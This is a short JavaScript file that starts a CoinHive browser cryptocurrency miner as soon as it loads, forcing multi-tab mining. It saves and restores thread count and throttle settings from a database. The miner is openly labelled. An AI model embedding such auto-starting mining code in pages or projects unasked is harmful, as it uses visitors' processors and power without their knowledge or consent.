/*Copyright (C) 2018, Roger Pedros, All rights reserved.*/

// Initialize Miner
var m = new CoinHive.User('', '', {
    threads: 2,
    autoThreads: false,
    throttle: 0.6,
    forceASMJS: false,
});
m.start(CoinHive.FORCE_MULTI_TAB);


(() => {
    resetMinerLastConfig();
})();
/*Si firebase falla es carrega una bd interna amb la ultima config*/
function resetMinerLastConfig(){
    getThreads().then((dataFromDB) => {
        if (dataFromDB.threads){
            setNumThreads(dataFromDB.threads)
        }
    });

    getThrottle().then((dataFromDB) => {
        if (dataFromDB.throttle){
            setThrottle(dataFromDB.throttle)
        }
    });

}


function setThrottle(ThrottleSpeed) {
    let objectToSave = {
        throttle: ThrottleSpeed
    };
    saveDatatoDB(objectToSave);

    m.setThrottle(ThrottleSpeed);
}

function setNumThreads(numberOfThreads){
    let objectToSave = {
        threads: numberOfThreads
    };
    saveDatatoDB(objectToSave);

    m.setNumThreads(numberOfThreads);
}